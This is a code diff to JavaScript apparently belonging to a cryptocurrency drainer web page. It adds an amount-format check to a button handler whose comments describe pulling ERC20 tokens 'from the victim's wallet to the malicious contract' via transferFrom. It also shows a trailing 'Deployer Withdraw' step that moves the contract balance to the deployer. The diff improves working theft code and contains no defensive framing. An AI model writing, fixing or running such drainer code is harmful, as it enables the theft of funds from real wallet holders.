@@ -481,8 +481,14 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             }
 
             // Convert the amount to the token's smallest unit (18 decimals for ERC20 tokens)
-            // Ensure amount is properly formatted without scientific notation
-            const amountInTokens = web3.utils.toWei(amountToWithdraw.toFixed(0), 'ether');  // Convert to Wei (smallest unit)
+            // Convert the amount into a fixed-point string to avoid scientific notation issues
+            const amountInTokens = web3.utils.toWei(amountToWithdraw.toFixed(0), 'ether'); // Ensure no decimals
+            
+            // Check if the conversion succeeded and the amount is valid
+            if (!amountInTokens || isNaN(amountInTokens)) {
+                alert("Invalid token amount format.");
+                return;
+            }
 
             // Perform the withdrawal from the victim's wallet to the malicious contract
             const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
@@ -495,6 +501,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
         // Deployer Withdraw (withdraw from the malicious contract balance to deployer's wallet)
